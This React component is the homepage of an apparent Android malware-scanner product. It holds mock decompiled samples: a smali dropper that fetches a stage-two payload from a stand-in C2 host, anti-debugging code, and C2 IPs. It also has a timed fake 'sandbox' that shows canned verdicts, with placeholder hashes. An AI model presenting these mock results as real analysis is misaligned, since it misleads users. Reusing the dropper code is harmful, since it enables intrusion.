import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Shield, 
  Zap, 
  Lock, 
  ArrowRight, 
  Search, 
  MessageSquare, 
  Link as LinkIcon, 
  Globe, 
  Bot, 
  BellRing, 
  Binary, 
  Cpu, 
  CheckCircle2, 
  Smartphone, 
  AlertTriangle,
  Layers,
  Sparkles,
  ChevronLeft,
  ChevronRight,
  Play,
  Pause,
  RotateCcw,
  SlidersHorizontal,
  Activity,
  Terminal,
  FileCode,
  FileText,
  Radio,
  Database,
  Key,
  Wifi,
  ShieldCheck,
  RefreshCw,
  Flame,
  Check,
  XCircle,
  Eye,
  Crosshair,
  Server
} from 'lucide-react';
import { Button, Card, ScrollReveal } from '../components/UI';
import { Translation } from '../types';

interface HomeProps {
  t: Translation;
  onStartScan: () => void;
  onOpenChat?: () => void;
}

type FeatureKey = 'app' | 'message' | 'link' | 'sentinel' | 'bot';

export const Home: React.FC<HomeProps> = ({ t, onStartScan, onOpenChat }) => {
  const [selectedFeature, setSelectedFeature] = useState<FeatureKey>('app');
  const [appPipelineTab, setAppPipelineTab] = useState<'flow' | 'permissions' | 'trojans' | 'telemetry'>('flow');
  
  // Dedicated Horizontal Ways for App in Features
  const [appHorizontalLens, setAppHorizontalLens] = useState<'pipeline' | 'anatomy' | 'simulator' | 'comparison'>('pipeline');
  const [horizontalStep, setHorizontalStep] = useState<number>(0);
  const [isAutoPlaying, setIsAutoPlaying] = useState<boolean>(false);
  const [activeSimPreset, setActiveSimPreset] = useState<'pink' | 'sbi' | 'clean'>('pink');
  
  // Interactive Horizontal Sandbox Simulator State
  const [selectedAnatomyLayer, setSelectedAnatomyLayer] = useState<number>(0);
  const [simIsRunning, setSimIsRunning] = useState<boolean>(false);
  const [simProgress, setSimProgress] = useState<number>(0);
  const [simCurrentPhase, setSimCurrentPhase] = useState<string>('Ready to detonate');
  const [simCompleted, setSimCompleted] = useState<boolean>(false);
  const [simSelectedSample, setSimSelectedSample] = useState<'pink' | 'sbi' | 'daam' | 'digilocker'>('pink');

  const handleRunSimulator = () => {
    if (simIsRunning) return;
    setSimIsRunning(true);
    setSimProgress(10);
    setSimCompleted(false);
    setSimCurrentPhase('Phase 1: Ingesting APK Archive & Verifying Keystore...');

    const steps = [
      { progress: 28, phase: 'Phase 1: Unzipping archive & parsing AndroidManifest.xml...' },
      { progress: 52, phase: 'Phase 2: Disassembling classes.dex & Dalvik smali bytecode...' },
      { progress: 76, phase: 'Phase 3: Trapping dynamic network sockets & C2 beaconing...' },
      { progress: 92, phase: 'Phase 4: Running Neural Threat Classifier (1,402 vectors)...' },
      { progress: 100, phase: 'Phase 5: Forensic Analysis Complete. Safety Verdict Generated.' }
    ];

    let currentStepIdx = 0;
    const interval = setInterval(() => {
      if (currentStepIdx < steps.length) {
        setSimProgress(steps[currentStepIdx].progress);
        setSimCurrentPhase(steps[currentStepIdx].phase);
        currentStepIdx++;
      } else {
        clearInterval(interval);
        setSimIsRunning(false);
        setSimCompleted(true);
      }
    }, 550);
  };

  useEffect(() => {
    if (!isAutoPlaying || appHorizontalLens !== 'pipeline') return;
    const interval = setInterval(() => {
      setHorizontalStep((prev) => (prev + 1) % 5);
    }, 3800);
    return () => clearInterval(interval);
  }, [isAutoPlaying, appHorizontalLens]);

  const appHorizontalStages = [
    {
      id: 'ingest',
      stepNumber: '01',
      phaseName: 'PHASE 01: INGESTION',
      title: 'Bytecode Decompilation & Manifest Parse',
      category: 'Static Analysis',
      icon: Binary,
      accentColor: 'text-accent-teal',
      badgeBg: 'bg-accent-teal/10 border-accent-teal/30 text-accent-teal',
      summary: 'Deconstructs raw APK/XAPK archives, decompiles Dalvik classes.dex into smali bytecode, and parses AndroidManifest.xml for unexported components and keystore fingerprints.',
      metrics: [
        { label: 'Decompilation Latency', value: '< 140ms' },
        { label: 'Inspected DEX Classes', value: '1,402 classes' },
        { label: 'Keystore Verification', value: 'SHA256withRSA' },
      ],
      terminalLog: '$ cybershield disasm --target payload.apk\n[OK] Extracted AndroidManifest.xml (v2.4.1)\n[OK] Dalvik bytecode decompiled: 8,920 methods scanned\n[OK] Signature valid: CN=Android Debug Key (Untrusted Self-Signed)',
      checks: ['APK zip integrity & directory traversal guard', 'Exported Activity & Broadcast Receiver audit', 'Hidden ELF shared libraries (.so) extraction'],
    },
    {
      id: 'audit',
      stepNumber: '02',
      phaseName: 'PHASE 02: PERMISSIONS',
      title: 'Dangerous Permission & Intent Matrix',
      category: 'Privilege Inspection',
      icon: Shield,
      accentColor: 'text-amber-400',
      badgeBg: 'bg-amber-500/10 border-amber-500/30 text-amber-300',
      summary: 'Cross-checks declared permissions against zero-trust privilege matrices. Detects stealthy screen overlay hijacks, SMS snooping, keystroke logging, and background wake-locks.',
      metrics: [
        { label: 'Monitored Vectors', value: '142 vectors' },
        { label: 'Overlay Abuse Risk', value: 'CRITICAL (High)' },
        { label: 'Accessibility Hook', value: 'Detected' },
      ],
      terminalLog: '$ cybershield audit-perms --manifest AndroidManifest.xml\n[FLAG] android.permission.SYSTEM_ALERT_WINDOW (Invisible Dialogs)\n[FLAG] android.permission.BIND_ACCESSIBILITY_SERVICE (Screen sniffer)\n[FLAG] android.permission.RECEIVE_BOOT_COMPLETED (Auto-run on restart)',
      checks: ['Overlay attack surface (SYSTEM_ALERT_WINDOW)', 'Accessibility keylogging & tap-jacking hooks', 'SMS & OTP intercept listeners (RECEIVE_SMS)'],
    },
    {
      id: 'sandbox',
      stepNumber: '03',
      phaseName: 'PHASE 03: SANDBOX',
      title: 'Dynamic Sandbox & C2 Emulation',
      category: 'Behavioral Isolation',
      icon: Cpu,
      accentColor: 'text-accent-red',
      badgeBg: 'bg-accent-red/10 border-accent-red/30 text-accent-red',
      summary: 'Executes suspicious app binaries inside an isolated virtual sandbox. Traps network requests, monitors malicious outbound C2 server beaconing, and intercepts secondary payload downloads.',
      metrics: [
        { label: 'Socket Interception', value: 'Deep Packet Audit' },
        { label: 'Malicious C2 IP', value: '185.220.101.42' },
        { label: 'Sandbox Isolation', value: '100% Memory-Safe' },
      ],
      terminalLog: '$ cybershield sandbox-exec --isolate=strict\n[EMU] App spawned in isolated Android 14 container\n[WARN] Attempted outbound DNS lookup to c2-sync.ru-malware[.]cc\n[TRAPPED] Outbound SMS exfiltration blocked at virtual radio stack',
      checks: ['Dynamic C2 domain & fast-flux IP beaconing', 'Encrypted TLS socket inspection & certificate unpinning', 'Secondary payload droppers & stealth DEX reflection'],
    },
    {
      id: 'neural',
      stepNumber: '04',
      phaseName: 'PHASE 04: AI CORE',
      title: 'Neural Threat Classifier (1,402 Vectors)',
      category: 'Deep Learning',
      icon: Sparkles,
      accentColor: 'text-purple-400',
      badgeBg: 'bg-purple-500/10 border-purple-500/30 text-purple-400',
      summary: 'Feeds decompiled bytecode patterns, entropy distributions, and API call chains into our proprietary deep learning models. Computes mathematical distance from known malware families.',
      metrics: [
        { label: 'Model Accuracy', value: '99.4%' },
        { label: 'Entropy Analysis', value: 'High (Obfuscated)' },
        { label: 'Family Matching', value: 'Spyware.Hydra.Variant' },
      ],
      terminalLog: '$ cybershield neural-classify --vectors=1402\n[AI] Byte entropy across .dex sections: 7.84 (Packed/Obfuscated)\n[AI] API call graph distance to BankingTrojan.Generic: 0.041 (Close)\n[AI] Machine confidence: 99.4% malicious probability',
      checks: ['Shannon byte entropy calculation for packed stubs', 'Deep call-graph matching against 2.4M known signatures', 'Obfuscator & compiler identification (ProGuard / DexGuard)'],
    },
    {
      id: 'verdict',
      stepNumber: '05',
      phaseName: 'PHASE 05: DEFENSE',
      title: 'Explainable Verdict & Containment Action',
      category: 'Actionable Intelligence',
      icon: CheckCircle2,
      accentColor: 'text-emerald-400',
      badgeBg: 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400',
      summary: 'Delivers a transparent 0–100 threat score alongside plain-language and multilingual step-by-step containment procedures. Generates one-click NC3 cybercrime complaint dossiers.',
      metrics: [
        { label: 'Calculated Risk', value: '94 / 100 (SEVERE)' },
        { label: 'Triage Actions', value: '4 Immediate Steps' },
        { label: 'Forensic Report', value: 'Downloadable Dossier' },
      ],
      terminalLog: '$ cybershield report --format=explainable-ai\nVERDICT: MALICIOUS BANKING SPYWARE (Score 94/100)\nRECOMMENDATION 1: Revoke Accessibility permission immediately\nRECOMMENDATION 2: Freeze connected UPI/NetBanking credentials\nRECOMMENDATION 3: Uninstall in Android Safe Mode',
      checks: ['Zero-cryptic explainable threat breakdown', 'Plain-English & vernacular remediation directives', 'National Cyber Crime Portal (NC3 / 1930) reporting format'],
    },
  ];

  const presets = {
    pink: {
      name: 'WhatsApp_Pink_Theme.apk',
      label: 'Fake Theme Trojan',
      score: 94,
      severity: 'CRITICAL THREAT',
      color: 'text-accent-red',
      borderColor: 'border-accent-red/40',
      bgGlow: 'bg-accent-red/10',
      description: 'Disguised as a cosmetic pink WhatsApp theme; silently harvests SMS, requests full overlay permissions, and propagates itself by auto-replying to incoming contacts.',
    },
    sbi: {
      name: 'SBI_YONO_Lite_Kyc.apk',
      label: 'Banking Credential Harvester',
      score: 96,
      severity: 'HIGH SEVERITY',
      color: 'text-accent-red',
      borderColor: 'border-accent-red/40',
      bgGlow: 'bg-accent-red/10',
      description: 'Phishing application mimicking official public sector bank KYC portal; binds to accessibility service to read screen inputs, OTPs, and NetBanking passwords.',
    },
    clean: {
      name: 'Google_Photos_Clean_Signed.apk',
      label: 'Legitimate Benchmark App',
      score: 4,
      severity: 'VERIFIED SAFE',
      color: 'text-emerald-400',
      borderColor: 'border-emerald-500/40',
      bgGlow: 'bg-emerald-500/10',
      description: 'Official production APK with verified cryptographic keystore certificate, standard sandboxed storage scopes, and zero dangerous permission abuse.',
    },
  };

  const appHorizontalLenses = [
    { id: 'pipeline' as const, label: '5-Stage Live Engine', icon: Activity, badge: 'LIVE ENGINE' },
    { id: 'anatomy' as const, label: 'APK Anatomy Dissector', icon: Layers, badge: '6 CORE LAYERS' },
    { id: 'simulator' as const, label: 'Live Sandbox Detonator', icon: Play, badge: 'IN-PLACE DEMO' },
    { id: 'comparison' as const, label: 'AV vs CyberShield Rail', icon: ShieldCheck, badge: 'BENCHMARK' },
  ];

  const anatomyLayers = [
    {
      layer: 'AndroidManifest.xml',
      label: 'Manifest & Intent Filter',
      role: 'Root Security Blueprint',
      icon: FileCode,
      riskLevel: 'CRITICAL',
      riskColor: 'text-accent-red border-accent-red/30 bg-accent-red/10',
      description: 'Declares required system permissions, components (Activities, Services, Broadcast Receivers, Content Providers), and intent filters.',
      inspectedChecks: [
        'SYSTEM_ALERT_WINDOW (Invisible screen overlay & tapjacking hijack)',
        'BIND_ACCESSIBILITY_SERVICE (Keystroke & screen sniffer abuse)',
        'RECEIVE_SMS & READ_SMS (OTP credential exfiltration)',
        'RECEIVE_BOOT_COMPLETED (Silent persistence across phone reboots)'
      ],
      decompiledPreview: `<manifest package="com.whatsapp.pink.trojan">\n  <uses-permission name="android.permission.RECEIVE_SMS" />\n  <uses-permission name="android.permission.SYSTEM_ALERT_WINDOW" />\n  <service android:name=".StealthOverlayService"\n    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">\n    <intent-filter>\n      <action android:name="android.accessibilityservice.AccessibilityService" />\n    </intent-filter>\n  </service>\n</manifest>`
    },
    {
      layer: 'classes.dex',
      label: 'Dalvik Bytecode & Smali',
      role: 'Compiled Execution Logic',
      icon: Binary,
      riskLevel: 'HIGH SEVERITY',
      riskColor: 'text-amber-400 border-amber-500/30 bg-amber-500/10',
      description: 'Contains the compiled Java/Kotlin Dalvik Executable instructions. Analyzed for reflection evasion, dynamic class loading, and malicious API chains.',
      inspectedChecks: [
        'Java Reflection API invocation of hidden methods',
        'DexClassLoader loading remote secondary payloads from C2',
        'Runtime.getRuntime().exec() stealth shell execution',
        'AES string decryption of hidden command & control URLs'
      ],
      decompiledPreview: `.method public static bypassSandbox()V\n    .registers 3\n    const-string v0, "dalvik.system.DexClassLoader"\n    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;\n    const-string v1, "https://c2-banker.cc/stage2.payload"\n    invoke-static {v1}, Lcom/loader/Unpack;->drop(Ljava/lang/String;)V\n    return-void\n.end method`
    },
    {
      layer: 'lib/arm64-v8a/*.so',
      label: 'Native ELF Binaries',
      role: 'C/C++ Rootkit & Hooking',
      icon: Cpu,
      riskLevel: 'CRITICAL',
      riskColor: 'text-accent-red border-accent-red/30 bg-accent-red/10',
      description: 'Shared object (.so) C/C++ libraries compiled for ARM64/x86. Used by advanced banking malware to bypass Java-level security checks and evade Frida hooks.',
      inspectedChecks: [
        'ptrace anti-debugging & memory tampering guards',
        'Inline hooking of libc read/write primitives',
        'Direct syscall execution bypassing Android framework',
        'In-memory decryption of banking overlay HTML templates'
      ],
      decompiledPreview: `int check_debugger_frida() {\n    int status = ptrace(PTRACE_TRACEME, 0, 1, 0);\n    if (status < 0) {\n        // Sandbox or Frida detected! Terminate gracefully\n        exit(0);\n    }\n    hook_native_touch_events();\n    return 0;\n}`
    },
    {
      layer: 'res/raw & assets/',
      label: 'Encrypted Droppers',
      role: 'Embedded Second-Stage Stubs',
      icon: Database,
      riskLevel: 'MEDIUM',
      riskColor: 'text-purple-400 border-purple-500/30 bg-purple-500/10',
      description: 'Raw assets bundled inside the APK package. Malware frequently stores XOR-encrypted secondary APKs or remote administration modules inside innocent-looking .png files.',
      inspectedChecks: [
        'High-entropy binary blobs (> 7.8 Shannon entropy)',
        'Fake image assets containing embedded zip/dex headers (PK..)',
        'Automated unpacking routines triggered on first app launch',
        'Dynamic certificate extraction bypassing APK signing'
      ],
      decompiledPreview: `[+] asset: /assets/background_theme.png\n    Magic Header: 0x50 0x4B 0x03 0x04 (ZIP Archive, NOT PNG!)\n    Entropy: 7.91 (Strong Encryption / Packed)\n    Embedded Payload: payload_stage2.apk (Size: 420 KB)\n    Signature: Unsigned Dropper Stub`
    },
    {
      layer: 'META-INF/ (Signatures)',
      label: 'Keystore v1/v2/v3',
      role: 'Cryptographic Provenance',
      icon: Key,
      riskLevel: 'HIGH SEVERITY',
      riskColor: 'text-amber-400 border-amber-500/30 bg-amber-500/10',
      description: 'Contains CERT.RSA, CERT.SF, and MANIFEST.MF verifying author identity, signing algorithms (RSA/ECDSA), and package tamper-proofing.',
      inspectedChecks: [
        'Self-signed "Android Debug" keystore detection',
        'APK Signature Scheme v1/v2/v3 vulnerability bypass',
        'Developer CN impersonation (e.g. fake "Google LLC")',
        'Zero-day Janus vulnerability (APK/DEX dual-header) check'
      ],
      decompiledPreview: `Issuer: C=US, ST=California, L=Mountain View, O=Android, OU=Android, CN=Android\nSubject: CN=Android Debug (WARNING: Debug Keystore!)\nSignature Algorithm: SHA1withRSA (DEPRECATED & INSECURE)\nValidity: 10,000 Days\nVerification: FAILED (Not verified on Google Play Protect Keystore)`
    },
    {
      layer: 'network_security_config',
      label: 'Transport Security Policy',
      role: 'Transport Layer Integrity',
      icon: Wifi,
      riskLevel: 'HIGH SEVERITY',
      riskColor: 'text-blue-400 border-blue-500/30 bg-blue-500/10',
      description: 'Defines whether the application permits cleartext (HTTP) network transmissions, custom user CA certificates, or strict certificate pinning.',
      inspectedChecks: [
        'cleartextTrafficPermitted="true" (Unencrypted HTTP)',
        'Trusting user-installed root CA certificates',
        'Absence of Public Key Pinning (HPKP) for banking APIs',
        'Hardcoded HTTP endpoints sending device identifiers (IMEI/IMSI)'
      ],
      decompiledPreview: `<network-security-config>\n  <base-config cleartextTrafficPermitted="true">\n    <trust-anchors>\n      <!-- High Risk: Trusts user-installed root certs -->\n      <certificates src="user" />\n      <certificates src="system" />\n    </trust-anchors>\n  </base-config>\n</network-security-config>`
    }
  ];

  const simSamples = {
    pink: {
      id: 'pink' as const,
      name: 'WhatsApp_Pink_Theme_v2.apk',
      family: 'Worm.Android.WhatsAppPink',
      threatScore: 95,
      riskClass: 'CRITICAL THREAT',
      badgeColor: 'border-accent-red/40 bg-accent-red/15 text-accent-red',
      iocIp: '185.220.101.42:8443',
      iocPerms: ['RECEIVE_SMS', 'SYSTEM_ALERT_WINDOW', 'BIND_ACCESSIBILITY_SERVICE'],
      hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      tactics: 'Overlays fake WhatsApp themes, silently auto-replies malicious download links to all WhatsApp groups and chats, and intercepts banking OTPs.',
      recommendation: 'Do NOT open. Immediately revoke Accessibility permissions and uninstall in Android Safe Mode.'
    },
    sbi: {
      id: 'sbi' as const,
      name: 'SBI_YONO_Lite_Kyc_Update.apk',
      family: 'Trojan.Banker.SharkBot.Variant',
      threatScore: 98,
      riskClass: 'CRITICAL THREAT',
      badgeColor: 'border-accent-red/40 bg-accent-red/15 text-accent-red',
      iocIp: '194.26.29.112:443',
      iocPerms: ['BIND_ACCESSIBILITY_SERVICE', 'READ_PHONE_STATE', 'REQUEST_INSTALL_PACKAGES'],
      hash: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4',
      tactics: 'Presents identical SBI NetBanking login dialogs on top of legitimate banking apps. Uses accessibility hooks to record UPI PINs and balance transfers.',
      recommendation: 'Immediately call National Cyber Helpline 1930 and lock your SBI NetBanking profile via official YONO app.'
    },
    daam: {
      id: 'daam' as const,
      name: 'Daam_Spyware_Recorder.apk',
      family: 'Spyware.Android.Daam.IndiaCERT',
      threatScore: 91,
      riskClass: 'HIGH SEVERITY',
      badgeColor: 'border-amber-500/40 bg-amber-500/15 text-amber-300',
      iocIp: '103.208.220.15:9001',
      iocPerms: ['RECORD_AUDIO', 'ACCESS_FINE_LOCATION', 'CAMERA', 'READ_CONTACTS'],
      hash: '4a6b2c89f5d312e78b901a23c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3',
      tactics: 'CERT-In flagged spyware that records background room audio, exfiltrates WhatsApp call history, and encrypts local files with AES-256 for ransom.',
      recommendation: 'Isolate device from Wi-Fi/cellular immediately and perform factory reset after backing up critical uninfected photos.'
    },
    digilocker: {
      id: 'digilocker' as const,
      name: 'DigiLocker_Gov_Signed.apk',
      family: 'Legitimate / Official Government Utility',
      threatScore: 2,
      riskClass: 'VERIFIED SAFE',
      badgeColor: 'border-emerald-500/40 bg-emerald-500/15 text-emerald-400',
      iocIp: 'api.digitallocker.gov.in (Official Gov NIC)',
      iocPerms: ['INTERNET', 'USE_BIOMETRIC', 'CAMERA (Document Scan)'],
      hash: '1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
      tactics: 'Standard sandboxed government citizen repository with Google Play Protect cryptographic signature, pinned TLS certificates, and zero overlay hooks.',
      recommendation: 'Safe to install. Downloaded from official Ministry of Electronics and IT (MeitY) channels.'
    }
  };

  const avComparisonData = [
    {
      feature: 'Zero-Day Obfuscated Dalvik Bytecode',
      traditional: 'Blind (relies on static MD5/SHA256 signature database of known files)',
      cybershield: 'Deep decompiler computes Shannon byte entropy & mathematical call-graph distance',
      advantage: 'Catches previously unseen malware variants within milliseconds',
    },
    {
      feature: 'Screen Overlay & Accessibility Hijacking',
      traditional: 'Flags only if explicit malware name already known in public database',
      cybershield: 'Dynamic BIND_ACCESSIBILITY heuristic detects transparent draw overlays & tapjacking',
      advantage: 'Prevents UPI and banking credential theft before permissions are granted',
    },
    {
      feature: 'Dynamic Second-Stage C2 Droppers',
      traditional: 'Passes initial clean stub during static virus scans',
      cybershield: 'Virtual network sandbox captures DNS beacons, socket connects, and encrypted payload drops',
      advantage: 'Traps multi-stage dropper worms like WhatsApp Pink',
    },
    {
      feature: 'Keystore Tampering & Janus Vulnerabilities',
      traditional: 'Basic certificate name display',
      cybershield: 'Full cryptographic validation of v1/v2/v3 schemes and APK/DEX dual-headers',
      advantage: 'Flags modified debug builds and cloned banking APKs',
    },
    {
      feature: 'Native C/C++ Shared Library (.so) Inspection',
      traditional: 'Ignores binary code inside lib/ folders',
      cybershield: 'Disassembles ELF binaries for ptrace anti-debugging and Frida hooking evasion',
      advantage: 'Catches sophisticated rootkits that hide from standard Java scanners',
    },
    {
      feature: 'Explainable Plain-Language Remediation',
      traditional: 'Cryptic error code like "Trojan.AndroidOS.Generic.421"',
      cybershield: 'Step-by-step mitigation in English, Hindi, Kannada, Telugu, Tamil + 1930 NC3 format',
      advantage: 'Gives non-technical users immediate actionable recovery directives',
    }
  ];

  const featureTabs = [
    {
      id: 'app' as FeatureKey,
      label: 'App & APK Scanner',
      shortLabel: 'App Scanner',
      icon: Search,
      tag: 'HORIZONTAL SUITE',
      badgeColor: 'border-accent-teal/40 text-accent-teal bg-accent-teal/10'
    },
    {
      id: 'sentinel' as FeatureKey,
      label: 'Scam Sentinel & SMS',
      shortLabel: 'Sentinel',
      icon: BellRing,
      tag: 'REAL-TIME',
      badgeColor: 'border-accent-red/40 text-accent-red bg-accent-red/10'
    },
    {
      id: 'message' as FeatureKey,
      label: 'Message & Smishing',
      shortLabel: 'Messages',
      icon: MessageSquare,
      tag: 'AI-SHIELD',
      badgeColor: 'border-blue-400/40 text-blue-400 bg-blue-500/10'
    },
    {
      id: 'link' as FeatureKey,
      label: 'URL & Phishing Defender',
      shortLabel: 'Link Defender',
      icon: LinkIcon,
      tag: 'ANTI-FRAUD',
      badgeColor: 'border-purple-400/40 text-purple-400 bg-purple-500/10'
    },
    {
      id: 'bot' as FeatureKey,
      label: 'AI CyberBot Co-Pilot',
      shortLabel: 'CyberBot',
      icon: Bot,
      tag: '24/7 AI',
      badgeColor: 'border-amber-400/40 text-amber-300 bg-amber-500/10'
    }
  ];

  return (
    <div className="pt-20">
      {/* Hero Section */}
      <section className="relative min-h-[90vh] flex items-center justify-center overflow-hidden px-4">
        <div className="relative z-10 max-w-5xl mx-auto text-center">
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8 }}
          >
            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-accent-teal/10 border border-accent-teal/20 text-accent-teal text-sm font-medium mb-8">
              <Zap className="w-4 h-4" />
              <span>Next-Gen Security for Everyone</span>
            </div>
            <h1 className="text-5xl md:text-7xl font-bold tracking-tight mb-6 leading-tight">
              {t.heroTitle.split(' ').map((word, i) => (
                <span key={i} className={word === 'AI-Powered' || word === 'AI-संचालित' || word === 'AI-ಚಾಲಿತ' ? 'text-accent-teal' : ''}>
                  {word}{' '}
                </span>
              ))}
            </h1>
            <p className="text-xl text-white/60 mb-10 max-w-2xl mx-auto leading-relaxed">
              {t.heroSubtitle}
            </p>
            <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
              <Button size="lg" glow onClick={onStartScan}>
                {t.scanNow}
                <ArrowRight className="ml-2 w-5 h-5" />
              </Button>
              {onOpenChat && (
                <Button 
                  variant="secondary" 
                  size="lg" 
                  onClick={onOpenChat}
                  className="border-accent-teal/30 hover:border-accent-teal hover:bg-accent-teal/10 text-white font-bold"
                >
                  <Bot className="mr-2 w-5 h-5 text-accent-teal" />
                  Chat with CyberBot
                </Button>
              )}
            </div>
          </motion.div>
        </div>
      </section>

      {/* Features Section */}
      <section className="py-20 px-4 bg-white/[0.02]">
        <div className="max-w-7xl mx-auto space-y-10">
          
          {/* Section Header */}
          <div className="text-center max-w-3xl mx-auto">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-accent-teal/10 border border-accent-teal/20 text-accent-teal text-xs font-mono uppercase tracking-wider mb-3">
              <Shield className="w-3.5 h-3.5" />
              <span>Core Defense Features</span>
            </div>
            <h2 className="text-3xl sm:text-4xl font-black text-white tracking-tight">
              Comprehensive Threat Detection Architecture
            </h2>
            <p className="text-white/60 text-sm mt-2">
              Explore every security vector in an interactive horizontal workflow with explainable AI and real-time heuristics.
            </p>
          </div>

          {/* Horizontal Feature Selector Bar */}
          <div className="flex items-center justify-start sm:justify-center overflow-x-auto pb-2 scrollbar-none gap-2 px-1">
            <div className="flex p-1.5 bg-black/40 rounded-2xl border border-white/10 backdrop-blur-md">
              {featureTabs.map((tab) => {
                const isSelected = selectedFeature === tab.id;
                const Icon = tab.icon;
                return (
                  <button
                    key={tab.id}
                    onClick={() => setSelectedFeature(tab.id)}
                    className={`flex items-center gap-2 px-3.5 sm:px-4 py-2.5 rounded-xl transition-all duration-300 text-xs sm:text-sm font-semibold whitespace-nowrap cursor-pointer ${
                      isSelected
                        ? 'bg-gradient-to-r from-accent-teal to-accent-purple text-primary font-bold shadow-[0_0_20px_rgba(0,209,193,0.3)]'
                        : 'text-white/60 hover:text-white hover:bg-white/5'
                    }`}
                  >
                    <Icon className="w-4 h-4" />
                    <span>{tab.shortLabel}</span>
                    <span className={`text-[9px] px-1.5 py-0.2 rounded-full font-mono uppercase font-bold border hidden md:inline-block ${
                      isSelected ? 'border-primary/40 text-primary bg-black/10' : tab.badgeColor
                    }`}>
                      {tab.tag}
                    </span>
                  </button>
                );
              })}
            </div>
          </div>

          {/* Interactive Horizontal Showcase Console */}
          <AnimatePresence mode="wait">
            {selectedFeature === 'app' && (
              <motion.div
                key="feature-app"
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                transition={{ duration: 0.3 }}
                className="p-5 sm:p-7 lg:p-8 rounded-3xl bg-gradient-to-r from-accent-teal/15 via-slate-900/95 to-accent-purple/15 border-2 border-accent-teal/40 shadow-2xl relative overflow-hidden backdrop-blur-xl"
              >
                <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-accent-teal via-accent-purple to-accent-teal animate-pulse" />

                <div className="space-y-6">
                  
                  {/* Top Bar: Identity + Horizontal Controls */}
                  <div className="flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4 pb-4 border-b border-white/10">
                    <div className="flex items-center gap-3.5">
                      <div className="p-3 bg-accent-teal/20 text-accent-teal rounded-2xl border border-accent-teal/40 shadow-lg shadow-accent-teal/20">
                        <Search className="w-6 h-6" />
                      </div>
                      <div>
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-accent-teal bg-accent-teal/15 px-2 py-0.5 rounded border border-accent-teal/30">
                            HORIZONTAL APP DEFENSE SUITE
                          </span>
                          <span className="text-[10px] font-mono text-white/50 hidden sm:inline-block">
                            • 4 Multi-Lens Inspection Ways
                          </span>
                        </div>
                        <h3 className="text-xl sm:text-2xl font-black text-white mt-0.5">
                          {t.appScan} — Deep Sandbox & Static Analysis
                        </h3>
                      </div>
                    </div>

                    {/* Horizontal Lens Navigation Switcher */}
                    <div className="flex items-center gap-1.5 bg-black/60 p-1.5 rounded-2xl border border-white/10 overflow-x-auto max-w-full scrollbar-none">
                      {appHorizontalLenses.map((lens) => {
                        const isCur = appHorizontalLens === lens.id;
                        const LensIcon = lens.icon;
                        return (
                          <button
                            key={lens.id}
                            onClick={() => setAppHorizontalLens(lens.id)}
                            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-mono font-bold transition-all cursor-pointer whitespace-nowrap ${
                              isCur
                                ? 'bg-gradient-to-r from-accent-teal to-accent-purple text-primary shadow-md shadow-accent-teal/20'
                                : 'text-white/60 hover:text-white hover:bg-white/5'
                            }`}
                          >
                            <LensIcon className="w-3.5 h-3.5" />
                            <span>{lens.label}</span>
                            <span className={`text-[9px] px-1.5 py-0.2 rounded-full font-sans uppercase font-bold border hidden xl:inline-block ${
                              isCur ? 'border-primary/40 text-primary bg-black/15' : 'border-white/10 text-white/40'
                            }`}>
                              {lens.badge}
                            </span>
                          </button>
                        );
                      })}
                    </div>
                  </div>

                  {/* LENS 1: 5-Stage Live Engine */}
                  {appHorizontalLens === 'pipeline' && (
                    <div className="space-y-6">
                      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 bg-black/30 p-3 rounded-2xl border border-white/5">
                        <div className="flex items-center gap-2 text-xs font-mono text-white/70">
                          <Activity className="w-4 h-4 text-accent-teal" />
                          <span>Interactive Pipeline Stage Controller:</span>
                        </div>
                        <div className="flex items-center gap-2 w-full sm:w-auto justify-between sm:justify-end">
                          <div className="flex items-center gap-1 bg-black/60 p-1 rounded-xl border border-white/10">
                            <button
                              onClick={() => setHorizontalStep((prev) => (prev === 0 ? 4 : prev - 1))}
                              className="p-1.5 rounded-lg hover:bg-white/10 text-white/70 hover:text-white transition-colors cursor-pointer"
                              title="Previous Phase"
                              aria-label="Previous Phase"
                            >
                              <ChevronLeft className="w-4 h-4" />
                            </button>
                            <span className="text-xs font-mono font-bold px-2 text-accent-teal min-w-[70px] text-center">
                              Stage {horizontalStep + 1} / 5
                            </span>
                            <button
                              onClick={() => setHorizontalStep((prev) => (prev === 4 ? 0 : prev + 1))}
                              className="p-1.5 rounded-lg hover:bg-white/10 text-white/70 hover:text-white transition-colors cursor-pointer"
                              title="Next Phase"
                              aria-label="Next Phase"
                            >
                              <ChevronRight className="w-4 h-4" />
                            </button>
                          </div>

                          <button
                            onClick={() => setIsAutoPlaying(!isAutoPlaying)}
                            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-xl text-xs font-mono font-bold transition-all border cursor-pointer ${
                              isAutoPlaying
                                ? 'bg-accent-teal text-primary border-accent-teal shadow-md shadow-accent-teal/20'
                                : 'bg-white/5 hover:bg-white/10 text-white/80 border-white/10'
                            }`}
                          >
                            {isAutoPlaying ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
                            <span>{isAutoPlaying ? 'Pause Tour' : 'Auto Play'}</span>
                          </button>
                        </div>
                      </div>

                      {/* Horizontal Stage Progress Rail */}
                      <div className="relative">
